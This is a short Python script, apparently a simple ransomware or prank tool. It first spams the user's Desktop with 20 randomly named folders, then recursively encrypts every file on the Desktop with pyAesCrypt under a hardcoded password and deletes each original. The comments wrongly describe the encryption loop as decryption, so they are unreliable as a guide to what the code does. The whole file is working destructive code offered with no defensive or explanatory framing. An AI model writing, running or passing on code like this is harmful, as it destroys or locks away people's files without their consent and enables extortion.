import getpass
import os
import rand_string.rand_string as rand


#SPAM CARTELLE
username = getpass.getuser()

try:
    i = 0
    while i < 20:
        x = rand.RandString("alphanumerical", 10)
        y = f"C:\\Users\\{username}\\Desktop\\{x}"
        os.mkdir(y)
        i += 1
except:
    print("ERRO")

import pyAesCrypt
import glob
import os


# Encryption/decryption buffer size - 64K
bufferSize = 64 * 1024
# Get current directory
curDir = os.getcwd()
# Prompt user for password to decrypt files
password1 = "12345"



# Main loop to decrypt all files in recursively
for x in glob.glob(f'C:\\Users\\{username}\\Desktop\\**', recursive=True):
    fullpath = os.path.join(curDir, x)
    fullnewf = os.path.join(curDir, x + '.new')

    # Encrypt
    if os.path.isfile(fullpath):
        pyAesCrypt.encryptFile(fullpath, fullnewf, password1, bufferSize)
        # Remove file after encryption
        os.remove(fullpath)